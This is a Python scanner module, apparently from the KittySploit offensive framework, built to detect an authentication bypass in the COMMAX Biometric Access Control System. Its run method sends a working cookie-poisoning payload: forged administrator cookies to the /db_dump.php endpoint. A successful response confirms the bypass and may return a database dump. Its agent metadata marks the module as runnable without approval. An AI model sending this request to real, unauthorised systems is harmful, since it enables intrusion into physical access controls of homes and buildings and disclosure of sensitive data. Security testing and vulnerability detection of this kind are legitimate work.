#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""COMMAX Biometric Access Control System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass Detection',
        'description': 'COMMAX Biometric Access Control System 1.0.0 suffers from an authentication bypass vulnerability. An unauthenticated attacker through cookie poisoning can bypass authentication and disclose sensitive information and circumvent physical controls in smart homes and buildings.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'commax', 'auth-bypass', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50206',
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5661.php',
        ],
    }

    def run(self):
        path = '/db_dump.php'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Referer': '{{BaseURL}}/user_add.php', 'Cookie': 'CMX_SAVED_ID=zero; CMX_ADMIN_ID=science; CMX_ADMIN_NM=liquidworm; CMX_ADMIN_LV=9; CMX_COMPLEX_NM=ZSL; CMX_COMPLEX_IP=2.5.1.0'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<title>::: COMMAX :::</title>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass detected', path=path)
            return True
        return False

